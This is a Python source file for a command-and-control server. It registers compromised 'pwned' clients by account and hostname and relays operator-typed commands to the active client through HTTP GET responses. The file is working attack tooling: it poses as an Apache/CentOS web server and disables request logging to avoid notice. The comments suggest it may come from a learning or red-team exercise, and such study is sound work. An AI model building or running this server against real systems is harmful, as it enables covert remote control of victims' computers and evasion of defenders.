# Command and Control server code

from http import server
from http.server import BaseHTTPRequestHandler, HTTPServer

# Port c2 server listens on
PORT = 80

# Leave blank for binding to all interfaces, otherwise specify c2 server's IP address
BIND_ADDR = ""

# Path to use for signifying a command request form a client using HTTP GET
CMD_REQUEST = "/book?isbn="

class C2Handler(BaseHTTPRequestHandler):
    """This is a child class of the BaseHTTPRequestHandler class.
    It handles all HTTP requests that arrive at the c2 server."""

    # Make our c2 server look like an up-to-date Apache server on CentOS
    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"

    # noinspection PyPep8Naming
    def do_GET(self):
        """ This method handles all HTTP GET requests that
        arrive at the c2 server."""

        # These variables must be global as they will often be updated via multiple sessions
        global active_session, client_account, client_hostname, pwned_dict, pwned_id

        # Follow this code block when the compromised computer is requesting a command
        if self.path.startswith(CMD_REQUEST):
            client = self.path.split(CMD_REQUEST)[1]

            if client not in pwned_dict.values():

                # Sends the HTTP response code and header back to the client
                self.http_response(200)

                # Increment our pwned_id and add the client to pwned_dict using pwned_id as the key
                pwned_id += 1
                pwned_dict[pwned_id] = client

                # Split out the client account name
                client_account = client.split("@")[0]

                # Split out the client account name
                client_hostname = client.split("@")[1]

                print(f"{client_account}@{client_hostname} has been pwned!\n")

            # If the client is in pwned_dict, and it is also our active session:
            elif client == pwned_dict[active_session]:

                # Collect the command to run on the client; set Linux style promt as well
                command = input(f"{client_account}@{client_hostname}: ")

                # Write the command back to the client as a response; must utf-8 encode
                self.http_response(200)
                self.wfile.write(command.encode())

            # The client is in pwned_dict, but it is not our active session:
            else:

                # Sends the HTTP response code and header back to the client
                self.http_response(404)

    def http_response(self, code: int):
                """ Function that sends the HTTP response code and headers back to the client."""
                self.send_response(code)
                self.end_headers()

    def log_request(self, code: int | str = "-", size: int | str = "-") -> None:
        """ Included this to override BaseHTTPRequestHandler's log_request method because it writes
        to the screen. Our dosen't log any successfuf connections; it just returns, which is whar we want. """
        return
        # return super().log_request(code, size)()

# This maps to the client that we have a promt for
active_session = 1

# This is the account from the client belonging to the active session
client_account = ""

# This is the hostname from the client belonging to the active session
client_hostname = ""

# Used to uniquely count and track each client connecting in to the c2 server
pwned_id = 0

# Tracks all pwned clients; key = pwned_id and value is unique from each client (account@hostname@epoch time)
pwned_dict = {}

# Instantiate oour HTTPServer object
server = HTTPServer((BIND_ADDR, PORT), C2Handler)

# Run the server in an infinite loop
server.serve_forever()